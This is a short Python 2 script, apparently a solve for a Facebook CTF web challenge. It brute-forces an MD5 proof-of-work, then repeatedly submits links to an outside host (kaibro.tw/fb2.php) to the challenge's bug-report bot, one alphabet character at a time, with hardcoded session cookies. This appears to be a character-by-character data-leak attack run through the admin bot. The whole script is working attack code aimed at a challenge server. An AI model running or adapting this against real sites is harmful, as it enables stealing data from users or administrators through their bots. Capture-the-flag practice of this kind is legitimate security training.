import requests
import hashlib
import re


def POW(target):
    mx = 10 ** 9
    nonce = 0
    while nonce < mx:    
        string = str(nonce)
        hash_result = hashlib.md5(string).hexdigest()
        if hash_result.startswith(target):
            print(hash_result)
            return string
        nonce += 1

alphabet = "@#$%^&*()-=+~:?0123456789|abcdefghijklmnopqrstuvwxyz<>ABCDEFGHIJKLMNOPQRSTUVWXYZ_"

for i in alphabet:

    cookie = {"session":"286b4d92-cf9d-4d8e-9da2-0d0ce6317ac2", "session":".eJwljjkOwzAMBP_C2oUOkiL9mUA8hKS14yrI32Mg2HJmgP3AYx15PmF_H1du8HgF7CAqXNVwJmG0qj0saBWt6qUPjegmprfC5u6JVKVRXblWcZ73PI14Yl9cR5_CLDciTjJyq3fVE4uMKbpKM13JEpjC3tpAD9jgOvP4n8HW4PsDAtIvzQ.XPJRVA.1J6roM-pNGSVmS9OS0rJr_BICpI;"}

    r = requests.get("http://challenges.fbctf.com:8082/report_bugs", cookies=cookie)
    #print(r.cookies)

    x = re.findall("proof of work for (.*) \(", r.text)
    print(x[0])

    ans = POW(x[0])
    print "ans:" + ans

    r2 = requests.post("http://challenges.fbctf.com:8082/report_bugs", data={"link":"http://kaibro.tw/fb2.php?1="+i, "pow_sol":ans, "body":"","title":""}, cookies=r.cookies)
    print r2.text
